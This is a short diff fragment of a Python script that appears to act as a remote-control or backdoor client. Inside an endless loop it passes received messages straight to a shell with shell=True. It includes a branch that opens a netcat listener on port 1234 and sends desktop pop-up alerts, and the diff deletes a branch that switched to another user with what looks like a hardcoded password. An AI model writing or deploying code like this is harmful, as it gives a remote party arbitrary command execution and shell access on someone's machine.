@@ -25,8 +25,6 @@ while True:
             msg="gnome-terminal -- bash -c 'nc -ln -p 1234'"
         elif(msg.split()[0]=="alert"):
             msg = "notify-send "+msg.split()[1]
-        elif(msg=="root"):
-            msg = "su newuser\nhello"
         run = subprocess.Popen(msg, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         result,error = run.communicate()
         if error:
